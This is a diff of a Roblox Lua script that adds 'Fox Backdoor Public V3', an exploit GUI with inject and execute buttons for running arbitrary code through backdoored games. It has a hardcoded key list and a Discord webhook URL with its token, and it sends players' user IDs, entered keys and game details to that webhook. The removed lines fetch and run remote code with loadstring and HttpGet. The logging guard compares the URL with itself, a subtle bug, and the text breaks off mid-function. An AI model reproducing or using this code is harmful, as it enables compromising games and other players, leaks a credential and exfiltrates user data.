@@ -1,46 +1,1050 @@
-local function sendChat(message)
-local TextChatService = game:GetService("TextChatService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
+-- Fox Backdoor Public - By Project Tigma Edition
+local FoxSS = {};
 
-if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then  
-    local generalChannel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")  
-    if generalChannel then  
-        generalChannel:SendAsync(message)  
-    end  
-else  
-    local sayMessage = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents"):FindFirstChild("SayMessageRequest")  
-    if sayMessage then  
-        sayMessage:FireServer(message, "All")  
-    end  
+-- Configuración de Discord
+local DISCORD_WEBHOOK_URL = " https://discord.com/api/webhooks/1475317753501188218/Mi6tPTEg7SW9f4n0KlakH9Bs3YpgSWnqs7Qb2xl0Ln7zZJDPHUhPhgFe1jWuVxxRRkN_"
+local LOG_TO_DISCORD = true
+
+-- =============================================
+-- SISTEMA DE KEY MÚLTIPLE
+-- =============================================
+
+-- Lista de keys válidas
+local KEYS_VALIDAS = {
+    ["fi bibass👀🥭"] = true,
+    ["top secret key"] = true,
+    ["mega secret"] = true,
+    ["fox key private"] = true,
+    ["123"] = true,
+    ["67"] = true
+}
+
+-- Crear pantalla de key
+local KeyGui = Instance.new("ScreenGui")
+KeyGui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+KeyGui.ResetOnSpawn = false
+KeyGui.Name = "FoxKeySystem"
+
+local KeyFrame = Instance.new("Frame")
+KeyFrame.Parent = KeyGui
+KeyFrame.BackgroundColor3 = Color3.fromRGB(40, 35, 30)
+KeyFrame.Size = UDim2.new(0, 350, 0, 250)
+KeyFrame.Position = UDim2.new(0.5, -175, 0.5, -125)
+KeyFrame.Active = true
+KeyFrame.Draggable = true
+
+-- Borde
+local KeyStroke = Instance.new("UIStroke", KeyFrame)
+KeyStroke.Color = Color3.fromRGB(235, 135, 60)
+KeyStroke.Thickness = 3
+
+-- Esquinas
+local KeyCorner = Instance.new("UICorner", KeyFrame)
+KeyCorner.CornerRadius = UDim.new(0, 8)
+
+-- Título
+local KeyTitle = Instance.new("TextLabel", KeyFrame)
+KeyTitle.Size = UDim2.new(1, 0, 0, 45)
+KeyTitle.Position = UDim2.new(0, 0, 0, 0)
+KeyTitle.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+KeyTitle.Text = "🦊 FOX BACKDOOR PUBLIC"
+KeyTitle.TextColor3 = Color3.fromRGB(235, 135, 60)
+KeyTitle.Font = Enum.Font.GothamBlack
+KeyTitle.TextSize = 20
+
+-- Texto
+local KeyLabel = Instance.new("TextLabel", KeyFrame)
+KeyLabel.Size = UDim2.new(1, 0, 0, 30)
+KeyLabel.Position = UDim2.new(0, 0, 0, 55)
+KeyLabel.BackgroundTransparency = 1
+KeyLabel.Text = "🔑 Ingresa tu key de acceso:"
+KeyLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+KeyLabel.Font = Enum.Font.Gotham
+KeyLabel.TextSize = 14
+
+-- Caja de texto
+local KeyTextBox = Instance.new("TextBox", KeyFrame)
+KeyTextBox.Size = UDim2.new(0.8, 0, 0, 40)
+KeyTextBox.Position = UDim2.new(0.1, 0, 0, 95)
+KeyTextBox.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+KeyTextBox.PlaceholderText = "Escribe tu key aquí..."
+KeyTextBox.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
+KeyTextBox.Text = ""
+KeyTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+KeyTextBox.Font = Enum.Font.Gotham
+KeyTextBox.TextSize = 14
+KeyTextBox.ClearTextOnFocus = false
+
+local KeyBoxStroke = Instance.new("UIStroke", KeyTextBox)
+KeyBoxStroke.Color = Color3.fromRGB(235, 135, 60)
+KeyBoxStroke.Thickness = 2
+
+local KeyBoxCorner = Instance.new("UICorner", KeyTextBox)
+KeyBoxCorner.CornerRadius = UDim.new(0, 4)
+
+-- Botón de verificar
+local KeyButton = Instance.new("TextButton", KeyFrame)
+KeyButton.Size = UDim2.new(0.5, 0, 0, 40)
+KeyButton.Position = UDim2.new(0.25, 0, 0, 150)
+KeyButton.BackgroundColor3 = Color3.fromRGB(235, 135, 60)
+KeyButton.Text = "🔓 VERIFICAR"
+KeyButton.TextColor3 = Color3.fromRGB(20, 20, 20)
+KeyButton.Font = Enum.Font.GothamBold
+KeyButton.TextSize = 14
+
+local KeyButtonCorner = Instance.new("UICorner", KeyButton)
+KeyButtonCorner.CornerRadius = UDim.new(0, 4)
+
+-- Mensaje de estado
+local KeyStatus = Instance.new("TextLabel", KeyFrame)
+KeyStatus.Size = UDim2.new(1, 0, 0, 25)
+KeyStatus.Position = UDim2.new(0, 0, 0, 200)
+KeyStatus.BackgroundTransparency = 1
+KeyStatus.Text = ""
+KeyStatus.TextColor3 = Color3.fromRGB(140, 50, 50)
+KeyStatus.Font = Enum.Font.Gotham
+KeyStatus.TextSize = 12
+
+-- Keys válidas mostradas (opcional)
+local KeysInfo = Instance.new("TextLabel", KeyFrame)
+KeysInfo.Size = UDim2.new(1, 0, 0, 20)
+KeysInfo.Position = UDim2.new(0, 0, 0, 225)
+KeysInfo.BackgroundTransparency = 1
+KeysInfo.Text = "🔐 Contacta para obtener una key"
+KeysInfo.TextColor3 = Color3.fromRGB(235, 135, 60)
+KeysInfo.Font = Enum.Font.Gotham
+KeysInfo.TextSize = 10
+
+-- Ocultar la GUI principal hasta que se verifique la key
+-- FoxSS["ScreenGui_1"].Enabled = false -- Esto se activará después
+
+-- Colores de zorro (para usar después)
+local FOX_COLORS = {
+    Background = Color3.fromRGB(40, 35, 30),      -- Marrón oscuro
+    Primary = Color3.fromRGB(235, 135, 60),       -- Naranja zorro
+    Secondary = Color3.fromRGB(255, 255, 255),    -- Blanco
+    Accent = Color3.fromRGB(20, 20, 20),          -- Negro
+    Text = Color3.fromRGB(255, 255, 255),         -- Blanco texto
+    Border = Color3.fromRGB(255, 140, 50),        -- Naranja brillante
+    ButtonBg = Color3.fromRGB(45, 40, 35),        -- Marrón claro para botones
+    Success = Color3.fromRGB(70, 130, 70),        -- Verde éxito
+    Error = Color3.fromRGB(140, 50, 50)           -- Rojo error
+}
+
+FoxSS["ScreenGui_1"] = Instance.new("ScreenGui")
+FoxSS["ScreenGui_1"].Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+FoxSS["ScreenGui_1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling
+FoxSS["ScreenGui_1"]["ResetOnSpawn"] = false
+FoxSS["ScreenGui_1"].Enabled = false -- Desactivado hasta key correcta
+
+-- =============================================
+-- SISTEMA DE ÍCONO FLOTANTE (TOGGLE)
+-- =============================================
+
+-- Crear el ícono flotante
+local IconGui = Instance.new("ScreenGui")
+IconGui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+IconGui.ResetOnSpawn = false
+IconGui.Name = "FoxIcon"
+IconGui.Enabled = false -- Se activará después de la key
+
+local IconButton = Instance.new("ImageButton")
+IconButton.Parent = IconGui
+IconButton.BackgroundColor3 = FOX_COLORS.Primary
+IconButton.BackgroundTransparency = 0.2
+IconButton.Size = UDim2.new(0, 50, 0, 50)
+IconButton.Position = UDim2.new(0, 20, 0.5, -25)
+IconButton.Image = "rbxassetid://125911042280308" -- ÍCONO PRINCIPAL
+IconButton.ImageColor3 = FOX_COLORS.Text
+IconButton.ScaleType = Enum.ScaleType.Fit
+IconButton.BackgroundTransparency = 0.3
+IconButton.Active = true
+IconButton.Draggable = true -- Se puede arrastrar
+
+-- Borde del ícono
+local IconStroke = Instance.new("UIStroke", IconButton)
+IconStroke.Color = FOX_COLORS.Primary
+IconStroke.Thickness = 2
+
+-- Esquinas redondeadas
+local IconCorner = Instance.new("UICorner", IconButton)
+IconCorner.CornerRadius = UDim.new(0, 8)
+
+-- Texto flotante (tooltip)
+local IconTooltip = Instance.new("TextLabel")
+IconTooltip.Parent = IconButton
+IconTooltip.BackgroundColor3 = FOX_COLORS.Accent
+IconTooltip.Size = UDim2.new(0, 100, 0, 25)
+IconTooltip.Position = UDim2.new(1, 5, 0.5, -12.5)
+IconTooltip.Text = "🦊 FOX BACKDOOR"
+IconTooltip.TextColor3 = FOX_COLORS.Primary
+IconTooltip.Font = Enum.Font.GothamBold
+IconTooltip.TextSize = 12
+IconTooltip.Visible = false
+IconTooltip.ZIndex = 10
+
+local TooltipStroke = Instance.new("UIStroke", IconTooltip)
+TooltipStroke.Color = FOX_COLORS.Primary
+TooltipStroke.Thickness = 1
+
+local TooltipCorner = Instance.new("UICorner", IconTooltip)
+TooltipCorner.CornerRadius = UDim.new(0, 4)
+
+-- Mostrar/ocultar tooltip
+IconButton.MouseEnter:Connect(function()
+    IconTooltip.Visible = true
+end)
+
+IconButton.MouseLeave:Connect(function()
+    IconTooltip.Visible = false
+end)
+
+-- Variable para controlar el estado del GUI
+local guiVisible = true
+
+-- Función para togglear el GUI
+local function toggleGUI()
+    guiVisible = not guiVisible
+    FoxSS["ScreenGui_1"].Enabled = guiVisible
+    
+    -- Cambiar opacidad del ícono según estado
+    if guiVisible then
+        IconButton.BackgroundTransparency = 0.2
+        IconButton.ImageColor3 = FOX_COLORS.Text
+        IconTooltip.Text = "🦊 FOX BACKDOOR (Visible)"
+    else
+        IconButton.BackgroundTransparency = 0.6
+        IconButton.ImageColor3 = FOX_COLORS.Primary
+        IconTooltip.Text = "🦊 FOX BACKDOOR (Oculto)"
+    end
 end
 
+-- Click en el ícono para toggle
+IconButton.MouseButton1Click:Connect(toggleGUI)
+
+-- También se puede togglear con tecla (F7)
+local UserInputService = game:GetService("UserInputService")
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if not gameProcessed and input.KeyCode == Enum.KeyCode.F7 then
+        toggleGUI()
+    end
+end)
+
+FoxSS["Frame_2"] = Instance.new("Frame", FoxSS["ScreenGui_1"])
+FoxSS["Frame_2"]["BorderSizePixel"] = 0
+FoxSS["Frame_2"]["BackgroundColor3"] = FOX_COLORS.Background
+FoxSS["Frame_2"]["Style"] = Enum.FrameStyle.DropShadow
+FoxSS["Frame_2"]["Size"] = UDim2.new(0, 588, 0, 320)
+FoxSS["Frame_2"]["Position"] = UDim2.new(0, 152, 0, 20)
+
+-- Título con estilo zorro
+FoxSS["TitleFrame"] = Instance.new("Frame", FoxSS["Frame_2"])
+FoxSS["TitleFrame"]["BorderSizePixel"] = 0
+FoxSS["TitleFrame"]["BackgroundColor3"] = FOX_COLORS.Accent
+FoxSS["TitleFrame"]["Size"] = UDim2.new(1, 0, 0, 25)
+FoxSS["TitleFrame"]["Position"] = UDim2.new(0, 0, 0, 0)
+
+FoxSS["TitleLabel"] = Instance.new("TextLabel", FoxSS["TitleFrame"])
+FoxSS["TitleLabel"]["BackgroundTransparency"] = 1
+FoxSS["TitleLabel"]["Size"] = UDim2.new(1, -10, 1, 0)
+FoxSS["TitleLabel"]["Position"] = UDim2.new(0, 5, 0, 0)
+FoxSS["TitleLabel"]["Text"] = "🦊 FOX BACKDOOR PUBLIC V3"
+FoxSS["TitleLabel"]["Font"] = Enum.Font.GothamBlack
+FoxSS["TitleLabel"]["TextSize"] = 16
+FoxSS["TitleLabel"]["TextColor3"] = FOX_COLORS.Primary
+FoxSS["TitleLabel"]["TextXAlignment"] = Enum.TextXAlignment.Left
+
+-- =============================================
+-- BOTÓN PARA OCULTAR SCRIPTS (CON IMAGEN)
+-- =============================================
+local HideButton = Instance.new("ImageButton")
+HideButton.Parent = FoxSS["TitleFrame"]
+HideButton.BackgroundTransparency = 1
+HideButton.Size = UDim2.new(0, 20, 0, 20)
+HideButton.Position = UDim2.new(1, -25, 0.5, -10)
+HideButton.Image = "rbxassetid://139727289505511" -- IMAGEN DE OCULTAR
+HideButton.ImageColor3 = FOX_COLORS.Primary
+HideButton.Name = "HideButton"
+
+-- Tooltip para el botón
+local HideTooltip = Instance.new("TextLabel")
+HideTooltip.Parent = HideButton
+HideTooltip.BackgroundColor3 = FOX_COLORS.Accent
+HideTooltip.Size = UDim2.new(0, 80, 0, 20)
+HideTooltip.Position = UDim2.new(0.5, -40, -1, -5)
+HideTooltip.Text = "Ocultar scripts"
+HideTooltip.TextColor3 = FOX_COLORS.Primary
+HideTooltip.Font = Enum.Font.Gotham
+HideTooltip.TextSize = 10
+HideTooltip.Visible = false
+HideTooltip.ZIndex = 10
+
+local HideTooltipStroke = Instance.new("UIStroke", HideTooltip)
+HideTooltipStroke.Color = FOX_COLORS.Primary
+HideTooltipStroke.Thickness = 1
+
+local HideTooltipCorner = Instance.new("UICorner", HideTooltip)
+HideTooltipCorner.CornerRadius = UDim.new(0, 4)
+
+-- Mostrar/ocultar tooltip
+HideButton.MouseEnter:Connect(function()
+    HideTooltip.Visible = true
+end)
+
+HideButton.MouseLeave:Connect(function()
+    HideTooltip.Visible = false
+end)
+
+-- Variable para controlar visibilidad de scripts
+local scriptsVisible = true
+
+-- Función para ocultar/mostrar scripts
+local function toggleScripts()
+    scriptsVisible = not scriptsVisible
+    
+    -- Ocultar/mostrar todos los elementos de scripts
+    FoxSS["Frame4_3"].Visible = scriptsVisible
+    FoxSS["Frame5_5"].Visible = scriptsVisible
+    FoxSS["TextButton2_7"].Visible = scriptsVisible
+    FoxSS["TextButton3_9"].Visible = scriptsVisible
+    FoxSS["TextButton_b"].Visible = scriptsVisible
+    FoxSS["Frame3_e"].Visible = scriptsVisible
+    FoxSS["TextButton4_10"].Visible = scriptsVisible
+    FoxSS["Frame_12"].Visible = scriptsVisible
+    FoxSS["Frame7_15"].Visible = scriptsVisible
+    FoxSS["Frame6_17"].Visible = scriptsVisible
+    FoxSS["TextLabel_19"].Visible = scriptsVisible
+    FoxSS["TextBox_1b"].Visible = scriptsVisible
+    FoxSS["Frame2_1e"].Visible = scriptsVisible
+    
+    -- Cambiar imagen del botón
+    if scriptsVisible then
+        HideButton.Image = "rbxassetid://139727289505511" -- Imagen de ocultar
+        HideTooltip.Text = "Ocultar scripts"
+    else
+        HideButton.Image = "rbxassetid://139727289505511" -- Usamos la misma imagen pero rotada
+        HideButton.Rotation = 180 -- Rotar 180 grados para mostrar
+        HideTooltip.Text = "Mostrar scripts"
+    end
 end
 
-sendChat("-gh 139904067056008, 108186273151388, 72292903231768, 84451219120140, 95290698984301, 14254923976 17163596085 4504231783")
+HideButton.MouseButton1Click:Connect(toggleScripts)
 
-wait(1)
+FoxSS["Frame4_3"] = Instance.new("Frame", FoxSS["Frame_2"])
+FoxSS["Frame4_3"]["BorderSizePixel"] = 0
+FoxSS["Frame4_3"]["BackgroundColor3"] = FOX_COLORS.Accent
+FoxSS["Frame4_3"]["Size"] = UDim2.new(0, 76, 0, 40)
+FoxSS["Frame4_3"]["Position"] = UDim2.new(0, 100, 0, 250)
+FoxSS["Frame4_3"]["Name"] = "Frame4"
 
-local Global = (getgenv and getgenv()) or shared
-Global.GelatekReanimateConfig = {
-["AnimationsDisabled"] = false,
-["R15ToR6"] = false,
-["DontBreakHairWelds"] = false,
-["PermanentDeath"] = true,
-["Headless"] = false,
-["TeleportBackWhenVoided"] = false,
-["AlignReanimate"] = false,
-["FullForceAlign"] = false,
-["FasterHeartbeat"] = true,
-["DynamicalVelocity"] = true,
-["DisableTweaks"] = false,
-["OptimizeGame"] = true,
-["LoadLibrary"] = false,
-["DetailedCredits"] = false,
-["TorsoFling"] = true,
-["BulletEnabled"] = true,
-["BulletConfig"] = {
-["RunAfterReanimate"] = true,
-["LockBulletOnTorso"] = false
+FoxSS["UIStroke_4"] = Instance.new("UIStroke", FoxSS["Frame4_3"])
+FoxSS["UIStroke_4"]["Color"] = FOX_COLORS.Primary
+FoxSS["UIStroke_4"]["Thickness"] = 2
+
+FoxSS["Frame5_5"] = Instance.new("Frame", FoxSS["Frame_2"])
+FoxSS["Frame5_5"]["BorderSizePixel"] = 0
+FoxSS["Frame5_5"]["BackgroundColor3"] = FOX_COLORS.Accent
+FoxSS["Frame5_5"]["Size"] = UDim2.new(0, 92, 0, 38)
+FoxSS["Frame5_5"]["Position"] = UDim2.new(0, 326, 0, 250)
+FoxSS["Frame5_5"]["Name"] = "Frame5"
+
+FoxSS["UIStroke_6"] = Instance.new("UIStroke", FoxSS["Frame5_5"])
+FoxSS["UIStroke_6"]["Color"] = FOX_COLORS.Primary
+FoxSS["UIStroke_6"]["Thickness"] = 2
+
+FoxSS["TextButton2_7"] = Instance.new("TextButton", FoxSS["Frame_2"])
+FoxSS["TextButton2_7"]["TextWrapped"] = true
+FoxSS["TextButton2_7"]["BorderSizePixel"] = 0
+FoxSS["TextButton2_7"]["TextScaled"] = true
+FoxSS["TextButton2_7"]["BackgroundColor3"] = FOX_COLORS.ButtonBg
+FoxSS["TextButton2_7"]["ZIndex"] = 2
+FoxSS["TextButton2_7"]["Size"] = UDim2.new(0, 76, 0, 40)
+FoxSS["TextButton2_7"]["Text"] = "🗑️ CLEAR"
+FoxSS["TextButton2_7"]["Name"] = "TextButton2"
+FoxSS["TextButton2_7"]["Position"] = UDim2.new(0, 100, 0, 250)
+FoxSS["TextButton2_7"]["Font"] = Enum.Font.GothamBold
+FoxSS["TextButton2_7"]["TextColor3"] = FOX_COLORS.Text
+
+FoxSS["UIStroke_8"] = Instance.new("UIStroke", FoxSS["TextButton2_7"])
+FoxSS["UIStroke_8"]["Color"] = FOX_COLORS.Primary
+FoxSS["UIStroke_8"]["Thickness"] = 2
+
+FoxSS["TextButton3_9"] = Instance.new("TextButton", FoxSS["Frame_2"])
+FoxSS["TextButton3_9"]["TextWrapped"] = true
+FoxSS["TextButton3_9"]["BorderSizePixel"] = 0
+FoxSS["TextButton3_9"]["TextSize"] = 15
+FoxSS["TextButton3_9"]["TextColor3"] = FOX_COLORS.Text
+FoxSS["TextButton3_9"]["BackgroundColor3"] = FOX_COLORS.ButtonBg
+FoxSS["TextButton3_9"]["ZIndex"] = 2
+FoxSS["TextButton3_9"]["Size"] = UDim2.new(0, 92, 0, 38)
+FoxSS["TextButton3_9"]["Text"] = "💉 INJECT"
+FoxSS["TextButton3_9"]["Name"] = "TextButton3"
+FoxSS["TextButton3_9"]["Position"] = UDim2.new(0, 326, 0, 250)
+FoxSS["TextButton3_9"]["Font"] = Enum.Font.GothamBold
+
+FoxSS["UIStroke_a"] = Instance.new("UIStroke", FoxSS["TextButton3_9"])
+FoxSS["UIStroke_a"]["Color"] = FOX_COLORS.Primary
+FoxSS["UIStroke_a"]["Thickness"] = 2
+
+FoxSS["TextButton_b"] = Instance.new("TextButton", FoxSS["Frame_2"])
+FoxSS["TextButton_b"]["TextWrapped"] = true
+FoxSS["TextButton_b"]["BorderSizePixel"] = 0
+FoxSS["TextButton_b"]["TextScaled"] = true
+FoxSS["TextButton_b"]["BackgroundColor3"] = FOX_COLORS.ButtonBg
+FoxSS["TextButton_b"]["ZIndex"] = 2
+FoxSS["TextButton_b"]["Size"] = UDim2.new(0, 78, 0, 40)
+FoxSS["TextButton_b"]["Text"] = "⚡ EXECUTE"
+FoxSS["TextButton_b"]["Position"] = UDim2.new(0, 14, 0, 250)
+FoxSS["TextButton_b"]["Font"] = Enum.Font.GothamBold
+FoxSS["TextButton_b"]["TextColor3"] = FOX_COLORS.Text
+
+FoxSS["UIStroke_c"] = Instance.new("UIStroke", FoxSS["TextButton_b"])
+FoxSS["UIStroke_c"]["Color"] = FOX_COLORS.Primary
+FoxSS["UIStroke_c"]["Thickness"] = 2
+
+FoxSS["UIStroke_d"] = Instance.new("UIStroke", FoxSS["Frame_2"])
+FoxSS["UIStroke_d"]["Thickness"] = 3
+FoxSS["UIStroke_d"]["Color"] = FOX_COLORS.Primary
+
+FoxSS["Frame3_e"] = Instance.new("Frame", FoxSS["Frame_2"])
+FoxSS["Frame3_e"]["BorderSizePixel"] = 0
+FoxSS["Frame3_e"]["BackgroundColor3"] = FOX_COLORS.Accent
+FoxSS["Frame3_e"]["Size"] = UDim2.new(0, 78, 0, 40)
+FoxSS["Frame3_e"]["Position"] = UDim2.new(0, 14, 0, 250)
+FoxSS["Frame3_e"]["Name"] = "Frame3"
+
+FoxSS["UIStroke_f"] = Instance.new("UIStroke", FoxSS["Frame3_e"])
+FoxSS["UIStroke_f"]["Color"] = FOX_COLORS.Primary
+FoxSS["UIStroke_f"]["Thickness"] = 2
+
+FoxSS["TextButton4_10"] = Instance.new("TextButton", FoxSS["Frame_2"])
+FoxSS["TextButton4_10"]["BorderSizePixel"] = 0
+FoxSS["TextButton4_10"]["TextSize"] = 15
+FoxSS["TextButton4_10"]["BackgroundColor3"] = FOX_COLORS.ButtonBg
+FoxSS["TextButton4_10"]["ZIndex"] = 2
+FoxSS["TextButton4_10"]["Size"] = UDim2.new(0, 58, 0, 38)
+FoxSS["TextButton4_10"]["Text"] = "🦊 R6"
+FoxSS["TextButton4_10"]["Name"] = "TextButton4"
+FoxSS["TextButton4_10"]["Position"] = UDim2.new(0, 258, 0, 250)
+FoxSS["TextButton4_10"]["Font"] = Enum.Font.GothamBold
+FoxSS["TextButton4_10"]["TextColor3"] = FOX_COLORS.Text
+
+FoxSS["UIStroke_11"] = Instance.new("UIStroke", FoxSS["TextButton4_10"])
+FoxSS["UIStroke_11"]["Color"] = FOX_COLORS.Primary
+FoxSS["UIStroke_11"]["Thickness"] = 2
+
+FoxSS["Frame_12"] = Instance.new("Frame", FoxSS["Frame_2"])
+FoxSS["Frame_12"]["BorderSizePixel"] = 0
+FoxSS["Frame_12"]["BackgroundColor3"] = FOX_COLORS.Accent
+FoxSS["Frame_12"]["Size"] = UDim2.new(0, 410, 0, 200)
+FoxSS["Frame_12"]["Position"] = UDim2.new(0, 6, 0, 32)
+
+FoxSS["UIStroke_13"] = Instance.new("UIStroke", FoxSS["Frame_12"])
+FoxSS["UIStroke_13"]["Color"] = FOX_COLORS.Primary
+FoxSS["UIStroke_13"]["Thickness"] = 2
+
+FoxSS["UICorner_14"] = Instance.new("UICorner", FoxSS["Frame_2"])
+FoxSS["UICorner_14"]["CornerRadius"] = UDim.new(0, 8)
+
+FoxSS["Frame7_15"] = Instance.new("Frame", FoxSS["Frame_2"])
+FoxSS["Frame7_15"]["BorderSizePixel"] = 0
+FoxSS["Frame7_15"]["BackgroundColor3"] = FOX_COLORS.ButtonBg
+FoxSS["Frame7_15"]["Size"] = UDim2.new(0, 118, 0, 262)
+FoxSS["Frame7_15"]["Position"] = UDim2.new(0, 438, 0, 24)
+FoxSS["Frame7_15"]["Name"] = "Frame7"
+
+FoxSS["UIStroke_16"] = Instance.new("UIStroke", FoxSS["Frame7_15"])
+FoxSS["UIStroke_16"]["Color"] = FOX_COLORS.Primary
+FoxSS["UIStroke_16"]["Thickness"] = 2
+
+FoxSS["Frame6_17"] = Instance.new("Frame", FoxSS["Frame_2"])
+FoxSS["Frame6_17"]["BorderSizePixel"] = 0
+FoxSS["Frame6_17"]["BackgroundColor3"] = FOX_COLORS.Accent
+FoxSS["Frame6_17"]["Size"] = UDim2.new(0, 58, 0, 38)
+FoxSS["Frame6_17"]["Position"] = UDim2.new(0, 258, 0, 250)
+FoxSS["Frame6_17"]["Name"] = "Frame6"
+
+FoxSS["UIStroke_18"] = Instance.new("UIStroke", FoxSS["Frame6_17"])
+FoxSS["UIStroke_18"]["Color"] = FOX_COLORS.Primary
+FoxSS["UIStroke_18"]["Thickness"] = 2
+
+FoxSS["TextLabel_19"] = Instance.new("TextLabel", FoxSS["Frame_2"])
+FoxSS["TextLabel_19"]["ZIndex"] = 2
+FoxSS["TextLabel_19"]["BorderSizePixel"] = 0
+FoxSS["TextLabel_19"]["BackgroundColor3"] = Color3.fromRGB(45, 40, 35)
+FoxSS["TextLabel_19"]["Size"] = UDim2.new(0, 100, 0, 20)
+FoxSS["TextLabel_19"]["Text"] = "🦊 FOX SCRIPTS"
+FoxSS["TextLabel_19"]["Position"] = UDim2.new(0, 438, 0, 4)
+FoxSS["TextLabel_19"]["Font"] = Enum.Font.GothamBold
+FoxSS["TextLabel_19"]["TextSize"] = 12
+FoxSS["TextLabel_19"]["TextColor3"] = FOX_COLORS.Primary
+
+FoxSS["UIStroke_1a"] = Instance.new("UIStroke", FoxSS["TextLabel_19"])
+FoxSS["UIStroke_1a"]["Color"] = FOX_COLORS.Primary
+FoxSS["UIStroke_1a"]["Thickness"] = 1
+
+FoxSS["TextBox_1b"] = Instance.new("TextBox", FoxSS["Frame_2"])
+FoxSS["TextBox_1b"]["ZIndex"] = 2
+FoxSS["TextBox_1b"]["BorderSizePixel"] = 2
+FoxSS["TextBox_1b"]["TextWrapped"] = true
+FoxSS["TextBox_1b"]["TextTransparency"] = 0
+FoxSS["TextBox_1b"]["ClearTextOnFocus"] = false
+FoxSS["TextBox_1b"]["BackgroundColor3"] = FOX_COLORS.Accent
+FoxSS["TextBox_1b"]["BorderMode"] = Enum.BorderMode.Inset
+FoxSS["TextBox_1b"]["MultiLine"] = true
+FoxSS["TextBox_1b"]["PlaceholderText"] = "🦊 Enter your script here..."
+FoxSS["TextBox_1b"]["PlaceholderColor3"] = Color3.fromRGB(150, 150, 150)
+FoxSS["TextBox_1b"]["Size"] = UDim2.new(0, 410, 0, 200)
+FoxSS["TextBox_1b"]["Position"] = UDim2.new(0, 6, 0, 32)
+FoxSS["TextBox_1b"]["Text"] = ""
+FoxSS["TextBox_1b"]["TextColor3"] = FOX_COLORS.Text
+FoxSS["TextBox_1b"]["Font"] = Enum.Font.Code
+FoxSS["TextBox_1b"]["TextSize"] = 14
+
+FoxSS["UIStroke_1c"] = Instance.new("UIStroke", FoxSS["TextBox_1b"])
+FoxSS["UIStroke_1c"]["Color"] = FOX_COLORS.Primary
+FoxSS["UIStroke_1c"]["Thickness"] = 2
+
+FoxSS["UIDragDetector_1d"] = Instance.new("UIDragDetector", FoxSS["Frame_2"])
+
+FoxSS["Frame2_1e"] = Instance.new("Frame", FoxSS["Frame_2"])
+FoxSS["Frame2_1e"]["BorderSizePixel"] = 0
+FoxSS["Frame2_1e"]["BackgroundColor3"] = FOX_COLORS.Accent
+FoxSS["Frame2_1e"]["Size"] = UDim2.new(0, 100, 0, 20)
+FoxSS["Frame2_1e"]["Position"] = UDim2.new(0, 438, 0, 4)
+FoxSS["Frame2_1e"]["Name"] = "Frame2"
+
+FoxSS["UIStroke_1f"] = Instance.new("UIStroke", FoxSS["Frame2_1e"])
+FoxSS["UIStroke_1f"]["Color"] = FOX_COLORS.Primary
+FoxSS["UIStroke_1f"]["Thickness"] = 1
+
+-- Project Tigma (adaptado)
+local Players = game:GetService("Players")
+local RS = game:GetService("ReplicatedStorage")
+local JS = game:GetService("JointsService")
+local LP = Players.LocalPlayer
+local StarterGui = game:GetService("StarterGui")
+local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
+
+local injected = false
+local attachedRemote = nil
+local playerName = LP.Name
+local gameInfo = {
+    name = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Desconocido",
+    placeId = game.PlaceId,
+    jobId = game.JobId
 }
-}
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Gelatekussy/GelatekReanimate/main/Main.lua"))()
+
+-- Función para enviar a Discord
+local function sendToDiscord(title, description, color, fields)
+    if not LOG_TO_DISCORD or DISCORD_WEBHOOK_URL == " https://discord.com/api/webhooks/1475317753501188218/Mi6tPTEg7SW9f4n0KlakH9Bs3YpgSWnqs7Qb2xl0Ln7zZJDPHUhPhgFe1jWuVxxRRkN_" then 
+        return 
+    end
+    
+    local data = {
+        ["embeds"] = {{
+            ["title"] = title,
+            ["description"] = description,
+            ["color"] = color,
+            ["fields"] = fields or {},
+            ["footer"] = {
+                ["text"] = "Fox Backdoor Public V3 • " .. os.date("%H:%M:%S"),
+                ["icon_url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=420&height=420&format=png"
+            },
+            ["timestamp"] = DateTime.now():ToIsoDate()
+        }}
+    }
+    
+    local success, response = pcall(function()
+        HttpService:PostAsync(DISCORD_WEBHOOK_URL, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
+    end)
+    
+    if not success then
+        warn("Error enviando a Discord:", response)
+    end
+end
+
+-- Función para loguear intentos de key
+local function logKeyAttempt(key, usuario, exitoso)
+    if not LOG_TO_DISCORD then return end
+    
+    local color = exitoso and 65280 or 16711680
+    local titulo = exitoso and "✅ Key Correcta - Acceso Concedido" or "❌ Key Incorrecta - Intento Fallido"
+    
+    -- Crear lista de keys válidas para el log
+    local keysList = ""
+    for k, _ in pairs(KEYS_VALIDAS) do
+        keysList = keysList .. "• " .. k .. "\n"
+    end
+    
+    sendToDiscord(
+        titulo,
+        "**Usuario:** " .. usuario,
+        color,
+        {
+            {
+                ["name"] = "👤 Usuario",
+                ["value"] = usuario .. " (`" .. LP.UserId .. "`)",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "🔑 Key ingresada",
+                ["value"] = "`" .. key .. "`",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "📊 Resultado",
+                ["value"] = exitoso and "✅ ACEPTADO" or "❌ RECHAZADO",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "📋 Keys válidas",
+                ["value"] = keysList,
+                ["inline"] = false
+            }
+        }
+    )
+end
+
+-- Función de verificación
+local function verificarKey(key)
+    -- Limpiar espacios al inicio y final
+    key = key:gsub("^%s+", ""):gsub("%s+$", "")
+    
+    -- Verificar si la key existe en la lista
+    return KEYS_VALIDAS[key] == true
+end
+
+-- Evento del botón de key
+KeyButton.MouseButton1Click:Connect(function()
+    local keyIngresada = KeyTextBox.Text
+    
+    if verificarKey(keyIngresada) then
+        -- Key correcta
